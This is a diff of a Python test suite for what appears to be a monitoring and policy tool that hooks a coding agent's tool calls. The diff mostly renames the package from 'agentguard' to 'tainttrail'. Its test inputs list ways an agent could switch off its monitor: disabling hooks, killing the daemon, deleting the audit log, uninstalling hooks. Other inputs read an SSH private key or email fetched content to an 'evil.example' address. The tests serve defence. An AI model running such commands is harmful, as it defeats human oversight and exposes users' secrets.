@@ -40,8 +40,8 @@ def fixture_payloads(prefix: str = "") -> list[tuple[str, dict]]:
 
 
 def _engine(db_path, enforce=False, **policy):
-    from agentguard.hooks import HookEngine
-    from agentguard.policy import from_dict
+    from tainttrail.hooks import HookEngine
+    from tainttrail.policy import from_dict
 
     return HookEngine(from_dict({"enforcement": enforce, **policy}), db_path=db_path)
 
@@ -67,7 +67,7 @@ def last(engine):
 
 
 def rows(db_path, **where):
-    from agentguard import audit
+    from tainttrail import audit
 
     out = audit.last(200, db_path)
     return [r for r in out if all(r.get(k) == v for k, v in where.items())]
@@ -187,7 +187,7 @@ def test_bash_patterns_come_from_the_policy_yaml(db_path):
     engine.handle(pre("Bash", {"command": "rm -rf build"}))      # replaced, not merged
     assert last(engine)["verdict"] == "ALLOW"
 
-    from agentguard.policy import from_dict
+    from tainttrail.policy import from_dict
     with pytest.raises(ValueError):
         from_dict({"hooks": {"bash": {"destructive": ["(unclosed"]}}})
     with pytest.raises(ValueError):
@@ -246,8 +246,8 @@ def test_subagent_calls_are_attributed(db_path):
 # =========================================================================
 def test_gateway_routed_mcp_call_is_not_double_counted(db_path):
     engine = _engine(db_path)
-    engine.handle(pre("mcp__agentguard__read_text_file", {"path": "/p/notes.md"},
-                      mcp_server={"name": "agentguard", "source": "project"}))
+    engine.handle(pre("mcp__tainttrail__read_text_file", {"path": "/p/notes.md"},
+                      mcp_server={"name": "tainttrail", "source": "project"}))
     assert rows(db_path, stage="TOOL_PREPARE") == [], "the gateway logs this call, not the hook"
 
     engine.handle(pre("mcp__github__add_issue_comment", {"body": "hi"}))
@@ -259,12 +259,12 @@ def test_gateway_routed_mcp_call_is_not_double_counted(db_path):
 def test_mcp_server_name_from_payload_is_used_for_dedupe(db_path):
     engine = _engine(db_path, hooks={"gateway_servers": ["guarded"]})
     engine.handle(pre("mcp__guarded__x", {"a": 1}, mcp_server={"name": "guarded"}))
-    engine.handle(pre("mcp__agentguard__x", {"a": 1}))      # not configured any more
-    assert [r["tool"] for r in rows(db_path, stage="TOOL_PREPARE")] == ["mcp__agentguard__x"]
+    engine.handle(pre("mcp__tainttrail__x", {"a": 1}))      # not configured any more
+    assert [r["tool"] for r in rows(db_path, stage="TOOL_PREPARE")] == ["mcp__tainttrail__x"]
 
 
 def test_github_write_tools_are_propagation_sinks():
-    from agentguard.policy import Policy
+    from tainttrail.policy import Policy
 
     p = Policy()
     for tool in ("add_issue_comment", "create_or_update_file", "push_files"):
@@ -277,8 +277,8 @@ def test_github_write_tools_are_propagation_sinks():
 async def test_hook_taint_reaches_the_gateway_through_correlation(upstream, db_path):
     """WebFetch (seen only by the hook) -> an MCP egress call (gated by the
     gateway). The gateway must see the hook session's taint."""
-    from agentguard.gateway import build_daemon
-    from agentguard.policy import Policy
+    from tainttrail.gateway import build_daemon
+    from tainttrail.policy import Policy
 
     p = Policy()
     p.enforcement = True
@@ -288,7 +288,7 @@ async def test_hook_taint_reaches_the_gateway_through_correlation(upstream, db_p
     engine.handle(post("WebFetch", {"url": "https://leak.example", "prompt": "x"},
                        {"result": page}, session="cc-1"))
     body = {"to": "outside@evil.example", "body": page}
-    engine.handle(pre("mcp__agentguard__email.send", body, session="cc-1"))   # noted only
+    engine.handle(pre("mcp__tainttrail__email.send", body, session="cc-1"))   # noted only
 
     async with Client(server) as client:
         with pytest.raises(ToolError):
@@ -301,8 +301,8 @@ async def test_hook_taint_reaches_the_gateway_through_correlation(upstream, db_p
 async def test_bridge_control_without_the_hook_note_the_gateway_sees_nothing(upstream, db_path):
     """Control for the test above: same taint, but no PreToolUse note, so no
     correlation - the gateway must not magically know about the WebFetch."""
-    from agentguard.gateway import build_daemon
-    from agentguard.policy import Policy
+    from tainttrail.gateway import build_daemon
+    from tainttrail.policy import Policy
 
     p = Policy()
     p.enforcement = True
@@ -318,7 +318,7 @@ async def test_bridge_control_without_the_hook_note_the_gateway_sees_nothing(ups
 
 
 def test_correlation_refuses_to_guess_between_sessions():
-    from agentguard.hooks import CorrelationIndex
+    from tainttrail.hooks import CorrelationIndex
 
     idx = CorrelationIndex(window=30)
     idx.note("email.send", {"a": 1}, "s1", now=100.0)
@@ -350,7 +350,7 @@ def test_observe_mode_never_returns_deny(db_path, tool, tool_input):
 
 
 def test_observe_mode_stays_silent_even_when_locked(db_path):
-    from agentguard.locks import LockStore
+    from tainttrail.locks import LockStore
 
     LockStore(db_path).lock_all("incident")
     engine = _engine(db_path, enforce=False)
@@ -369,8 +369,8 @@ def test_enforce_maps_block_to_deny_and_review_to_ask(db_path):
 
 
 def test_an_approved_ask_is_a_false_positive_candidate(db_path):
-    from agentguard import report
-    from agentguard.review_queue import ReviewQueue
+    from tainttrail import report
+    from tainttrail.review_queue import ReviewQueue
 
     engine = _engine(db_path, enforce=True)
     r = engine.handle(pre("Bash", {"command": "rm -rf build"}, tool_use_id="toolu_rm"))
@@ -390,7 +390,7 @@ def test_an_approved_ask_is_a_false_positive_candidate(db_path):
 
 
 def test_approval_is_found_after_a_daemon_restart(db_path):
-    from agentguard.review_queue import ReviewQueue
+    from tainttrail.review_queue import ReviewQueue
 
     _engine(db_path, enforce=True).handle(
         pre("Bash", {"command": "rm -rf dist"}, tool_use_id="toolu_restart"))
@@ -411,11 +411,11 @@ def test_approval_is_found_after_a_daemon_restart(db_path):
                "content": '{"disableAllHooks": true}'}),
     ("Edit", {"file_path": "<LIVE_POLICY>", "old_string": "true", "new_string": "false"}),
     ("Bash", {"command": "taskkill /F /IM python.exe"}),
-    ("Bash", {"command": "pkill -f agentguard"}),
-    ("Bash", {"command": "sqlite3 <LIVE_HOME>/agentguard.db 'delete from audit'"}),
-    ("Bash", {"command": "schtasks /Delete /TN AgentGuard /F"}),
+    ("Bash", {"command": "pkill -f tainttrail"}),
+    ("Bash", {"command": "sqlite3 <LIVE_HOME>/tainttrail.db 'delete from audit'"}),
+    ("Bash", {"command": "schtasks /Delete /TN TaintTrail /F"}),
     ("PowerShell", {"command": "Stop-Process -Name python -Force"}),
-    ("Bash", {"command": "agentguard uninstall-hooks"}),
+    ("Bash", {"command": "tainttrail uninstall-hooks"}),
     ("Bash", {"command": "echo '{\"disableAllHooks\": true}' > .claude/settings.local.json"}),
 ])
 def test_self_protection_fires(db_path, tool, tool_input):
@@ -428,7 +428,7 @@ def test_self_protection_fires(db_path, tool, tool_input):
     assert decision(enforcing.handle(pre(tool, live(tool_input)))) == "deny"
 
 
-LIVE_POLICY = "D:/live-week/agentguard.policy.yaml"
+LIVE_POLICY = "D:/live-week/tainttrail.policy.yaml"
 
 
 def live_engine(engine):
@@ -439,10 +439,10 @@ def live_engine(engine):
 
 def live(tool_input):
     """Resolve <LIVE_POLICY>, <LIVE_HOME> and <USER_SETTINGS> to the live paths."""
-    from agentguard.config import agentguard_home
-    from agentguard.hooks import claude_home
+    from tainttrail.config import tainttrail_home
+    from tainttrail.hooks import claude_home
 
-    subs = {"<LIVE_POLICY>": LIVE_POLICY, "<LIVE_HOME>": agentguard_home().as_posix(),
+    subs = {"<LIVE_POLICY>": LIVE_POLICY, "<LIVE_HOME>": tainttrail_home().as_posix(),
             "<USER_SETTINGS>": str(claude_home() / "settings.json")}
     out = {}
     for key, value in tool_input.items():
@@ -457,10 +457,10 @@ def test_self_protection_covers_the_real_home_and_claude_dirs(db_path, monkeypat
     home = tempfile.mkdtemp(prefix="ag-sp-")
     claude = tempfile.mkdtemp(prefix="ag-sp-claude-")
     try:
-        monkeypatch.setenv("AGENTGUARD_HOME", home)
+        monkeypatch.setenv("TAINTTRAIL_HOME", home)
         monkeypatch.setenv("CLAUDE_CONFIG_DIR", claude)
         engine = _engine(db_path)
-        engine.handle(pre("Write", {"file_path": str(Path(home) / "agentguard.json"), "content": "{}"}))
+        engine.handle(pre("Write", {"file_path": str(Path(home) / "tainttrail.json"), "content": "{}"}))
         assert "selfprotect:tamper" in last(engine)["signals"]
         engine.handle(pre("Write", {"file_path": str(Path(claude) / "settings.json"), "content": "{}"}))
         assert "selfprotect:tamper" in last(engine)["signals"]
@@ -483,8 +483,8 @@ def test_self_protection_can_be_disabled(db_path):
 def _http_client(db_path, enforce=False):
     from starlette.testclient import TestClient
 
-    from agentguard.gateway import build_daemon
-    from agentguard.policy import Policy
+    from tainttrail.gateway import build_daemon
+    from tainttrail.policy import Policy
 
     p = Policy()
     p.enforcement = enforce
@@ -509,7 +509,7 @@ def test_http_endpoint_answers_in_the_documented_format(db_path):
 
         health = client.get("/hooks/health").json()
         assert {k: health[k] for k in ("ok", "service", "mode")} == \
-            {"ok": True, "service": "agentguard", "mode": "enforce"}
+            {"ok": True, "service": "tainttrail", "mode": "enforce"}
         # added for `status` (pre-launch pass): versions of the running daemon
         assert {"version", "detector_version", "policy_version", "policy"} <= set(health)
 
@@ -553,11 +553,11 @@ class _FakeDaemon:
 
 
 def _run_client(monkeypatch, payload, url, timeout="1.0", fail_mode="open"):
-    from agentguard import hookclient
+    from tainttrail import hookclient
 
-    monkeypatch.setenv("AGENTGUARD_HOOK_URL", url)
-    monkeypatch.setenv("AGENTGUARD_HOOK_TIMEOUT", timeout)
-    monkeypatch.setenv("AGENTGUARD_HOOK_FAIL_MODE", fail_mode)
+    monkeypatch.setenv("TAINTTRAIL_HOOK_URL", url)
+    monkeypatch.setenv("TAINTTRAIL_HOOK_TIMEOUT", timeout)
+    monkeypatch.setenv("TAINTTRAIL_HOOK_FAIL_MODE", fail_mode)
     out, err = StringIO(), StringIO()
     start = time.perf_counter()
     code = hookclient.main(BytesIO(json.dumps(payload).encode()), out, err)
@@ -614,7 +614,7 @@ def test_command_hook_never_relays_non_json(monkeypatch):
 
 def test_command_hook_imports_only_the_standard_library():
     probe = (
-        "import sys, agentguard.hookclient, agentguard.cli\n"
+        "import sys, tainttrail.hookclient, tainttrail.cli\n"
         "heavy = {'fastmcp','yaml','detect_secrets','mcp','pydantic','starlette','httpx','uvicorn'}\n"
         "print(sorted(m for m in sys.modules if m.split('.')[0] in heavy))\n"
     )
@@ -630,8 +630,8 @@ def test_command_hook_end_to_end_against_the_real_daemon_app(db_path, monkeypatc
 
     import uvicorn
 
-    from agentguard.gateway import build_daemon
-    from agentguard.policy import Policy
+    from tainttrail.gateway import build_daemon
+    from tainttrail.policy import Policy
 
     p = Policy()
     p.enforcement = True
@@ -671,7 +671,7 @@ def fake_home(monkeypatch):
     monkeypatch.setenv("HOME", home)
     monkeypatch.setenv("USERPROFILE", home)
     monkeypatch.delenv("CLAUDE_CONFIG_DIR", raising=False)
-    monkeypatch.setenv("AGENTGUARD_HOME", str(Path(home) / ".agentguard"))
+    monkeypatch.setenv("TAINTTRAIL_HOME", str(Path(home) / ".tainttrail"))
     try:
         yield Path(home)
     finally:
@@ -690,12 +690,12 @@ UNRELATED = {
 
 
 def _cli(*argv):
-    from agentguard.cli import main
+    from tainttrail.cli import main
     return main(list(argv))
 
 
 def test_install_is_idempotent_and_keeps_unrelated_hooks(fake_home):
-    from agentguard import hookinstall
+    from tainttrail import hookinstall
 
     path = fake_home / ".claude" / "settings.json"
     assert hookinstall.settings_path() == path, "resolves to the (fake) home directory"
@@ -711,13 +711,13 @@ def test_install_is_idempotent_and_keeps_unrelated_hooks(fake_home):
     assert {e["event"] for e in ours} == {"PreToolUse", "PostToolUse"}
     assert all(e["url"] == "http://127.0.0.1:9000/hooks/claude-code" and e["timeout"] == 5
                for e in ours)
-    backups = list(path.parent.glob("settings.json.agentguard-backup-*"))
+    backups = list(path.parent.glob("settings.json.tainttrail-backup-*"))
     assert len(backups) == 1 and json.loads(backups[0].read_text()) == UNRELATED
 
     before = path.read_bytes()
     assert _cli("install-hooks") == 0
     assert path.read_bytes() == before, "second install changes nothing"
-    assert len(list(path.parent.glob("settings.json.agentguard-backup-*"))) == 1
+    assert len(list(path.parent.glob("settings.json.tainttrail-backup-*"))) == 1
 
 
 def test_uninstall_restores_the_original(fake_home):
@@ -744,11 +744,11 @@ def test_install_refuses_invalid_json_and_writes_nothing(fake_home):
     path.write_text('{"theme": "dark",', encoding="utf-8")
     assert _cli("install-hooks") == 1
     assert path.read_text(encoding="utf-8") == '{"theme": "dark",'
-    assert not list(path.parent.glob("*.agentguard-backup-*"))
+    assert not list(path.parent.glob("*.tainttrail-backup-*"))
 
 
 def test_install_command_type_and_project_scope(fake_home, monkeypatch):
-    from agentguard import hookinstall
+    from tainttrail import hookinstall
 
     project = fake_home / "proj"
     project.mkdir()
@@ -756,14 +756,14 @@ def test_install_command_type_and_project_scope(fake_home, monkeypatch):
     assert _cli("install-hooks", "--project", "--type", "command") == 0
     entries = hookinstall.installed(project / ".claude" / "settings.json")
     assert entries and entries[0]["type"] == "command"
-    assert entries[0]["args"] == ["-m", "agentguard.hookclient"]
+    assert entries[0]["args"] == ["-m", "tainttrail.hookclient"]
     assert Path(entries[0]["command"]).name.lower().startswith("python")
     assert not (fake_home / ".claude" / "settings.json").exists(), "user settings untouched"
 
 
 def test_fail_closed_forces_the_command_hook(fake_home):
-    from agentguard import config as cfg
-    from agentguard import hookinstall
+    from tainttrail import config as cfg
+    from tainttrail import hookinstall
 
     cfg.save(cfg.Config())
     assert _cli("install-hooks", "--fail-closed") == 0
@@ -773,7 +773,7 @@ def test_fail_closed_forces_the_command_hook(fake_home):
 
 
 def test_doctor_checks_hook_installation_and_endpoint(fake_home, monkeypatch):
-    from agentguard import daemonctl, doctor
+    from tainttrail import daemonctl, doctor
 
     result = doctor.check_hooks(9000)
     assert result.status == "WARN" and "not installed" in result.detail
@@ -784,7 +784,7 @@ def test_doctor_checks_hook_installation_and_endpoint(fake_home, monkeypatch):
     assert result.status == "FAIL" and "fail open" in result.detail
 
     monkeypatch.setattr(daemonctl, "probe",
-                        lambda port, timeout=1.0: {"ok": True, "service": "agentguard",
+                        lambda port, timeout=1.0: {"ok": True, "service": "tainttrail",
                                                    "mode": "observe"})
     assert doctor.check_hooks(9000).status == "PASS"
     assert doctor.check_hooks(9500).status == "FAIL", "hook URL port must match the daemon"
@@ -804,8 +804,8 @@ CREATE TABLE audit (
 
 
 def _old_database(path: str, n: int = 3) -> None:
-    """A database exactly as a pre-readiness AgentGuard wrote it."""
-    from agentguard.audit import GENESIS, _entry_hash
+    """A database exactly as a pre-readiness TaintTrail wrote it."""
+    from tainttrail.audit import GENESIS, _entry_hash
 
     conn = sqlite3.connect(path)
     conn.executescript(OLD_SCHEMA)
@@ -827,9 +827,9 @@ def _old_database(path: str, n: int = 3) -> None:
 
 
 def test_hash_chain_verifies_after_migration(db_path):
-    from agentguard import audit
-    from agentguard.decision import Decision, Verdict
-    from agentguard.db import connect
+    from tainttrail import audit
+    from tainttrail.decision import Decision, Verdict
+    from tainttrail.db import connect
 
     _old_database(db_path)
     conn = connect(db_path)                      # migrates on connect
@@ -846,9 +846,9 @@ def test_hash_chain_verifies_after_migration(db_path):
 
 
 def test_source_is_covered_by_the_hash_chain(db_path):
-    from agentguard import audit
-    from agentguard.db import connect
-    from agentguard.decision import Decision, Verdict
+    from tainttrail import audit
+    from tainttrail.db import connect
+    from tainttrail.decision import Decision, Verdict
 
     rid = audit.record(stage="TOOL_PREPARE", decision=Decision(Verdict.BLOCK, 0.8),
                        tool="Bash", db_path=db_path, source="hook")
@@ -863,14 +863,14 @@ def test_source_is_covered_by_the_hash_chain(db_path):
 
 
 def test_report_by_source(db_path):
-    from agentguard import report
-    from agentguard.gateway import build_daemon  # noqa: F401  (import check)
+    from tainttrail import report
+    from tainttrail.gateway import build_daemon  # noqa: F401  (import check)
 
     engine = _engine(db_path)
     engine.handle(pre("Bash", {"command": "cat ~/.ssh/id_rsa"}))
     engine.handle(pre("Bash", {"command": "ls"}))
-    from agentguard import audit
-    from agentguard.decision import Decision, Verdict
+    from tainttrail import audit
+    from tainttrail.decision import Decision, Verdict
     audit.record(stage="TOOL_PREPARE", decision=Decision(Verdict.ALLOW), tool="web.search",
                  db_path=db_path)
 
@@ -884,7 +884,7 @@ def test_report_by_source(db_path):
 def test_cli_report_by_source_runs(monkeypatch, capsys):
     home = tempfile.mkdtemp(prefix="ag-rep-")
     try:
-        monkeypatch.setenv("AGENTGUARD_HOME", home)
+        monkeypatch.setenv("TAINTTRAIL_HOME", home)
         engine = _engine(None)
         engine.handle(pre("Bash", {"command": "ls"}))
         assert _cli("report", "--since", "1d", "--by-source") == 0
@@ -897,8 +897,8 @@ def test_cli_report_by_source_runs(monkeypatch, capsys):
 # the daemon without an upstream
 # =========================================================================
 def test_daemon_runs_hooks_only_without_an_upstream(db_path):
-    from agentguard.gateway import build_daemon
-    from agentguard.policy import Policy
+    from tainttrail.gateway import build_daemon
+    from tainttrail.policy import Policy
 
     server, guard, engine = build_daemon(None, policy=Policy(), db_path=db_path)
     assert guard is None and engine is not None
@@ -907,8 +907,8 @@ def test_daemon_runs_hooks_only_without_an_upstream(db_path):
 
 
 def test_windows_daemon_definition_restarts_and_stops_cleanly(tmp_home=None):
-    from agentguard.config import Config
-    from agentguard.onboarding import build_daemon_plan
+    from tainttrail.config import Config
+    from tainttrail.onboarding import build_daemon_plan
 
     plan = build_daemon_plan(Config(port=9000), system="windows")
     assert "goto loop" in plan.content and "daemon.stop" in plan.content
@@ -917,7 +917,7 @@ def test_windows_daemon_definition_restarts_and_stops_cleanly(tmp_home=None):
     assert "timeout /t" not in plan.content and "ping -n" in plan.content
     assert "daemon.log" in plan.content
     assert "--upstream" not in plan.content          # hooks-only daemon
-    assert plan.start_cmd == ["schtasks", "/Run", "/TN", "AgentGuard"]
+    assert plan.start_cmd == ["schtasks", "/Run", "/TN", "TaintTrail"]
     [(vbs_path, vbs)] = plan.extra_files.items()
     assert vbs_path.suffix == ".vbs" and ", 0, False" in vbs     # hidden window
     assert "wscript.exe" in " ".join(plan.activate_cmd)
@@ -926,9 +926,9 @@ def test_windows_daemon_definition_restarts_and_stops_cleanly(tmp_home=None):
 def test_shipped_policy_lists_the_hook_patterns_explicitly():
     """The patterns live in the policy YAML; the code defaults only back-fill a
     policy without a hooks section. The two must not drift apart."""
-    from agentguard.policy import DEFAULT_HOOK_BASH, load
+    from tainttrail.policy import DEFAULT_HOOK_BASH, load
 
-    shipped = load(ROOT / "agentguard.policy.yaml")
+    shipped = load(ROOT / "tainttrail.policy.yaml")
     assert shipped.hooks.bash == DEFAULT_HOOK_BASH
     assert shipped.hooks.self_protection is True
 
@@ -936,8 +936,8 @@ def test_shipped_policy_lists_the_hook_patterns_explicitly():
 def test_audit_listing_shows_the_source(monkeypatch, capsys):
     home = tempfile.mkdtemp(prefix="ag-aud-")
     try:
-        monkeypatch.setenv("AGENTGUARD_HOME", home)
-        _engine(None).handle(pre("Bash", {"command": "echo agentguard-test"}))
+        monkeypatch.setenv("TAINTTRAIL_HOME", home)
+        _engine(None).handle(pre("Bash", {"command": "echo tainttrail-test"}))
         assert _cli("audit", "--last", "5") == 0
         out = capsys.readouterr().out
         assert "source" in out.splitlines()[0]
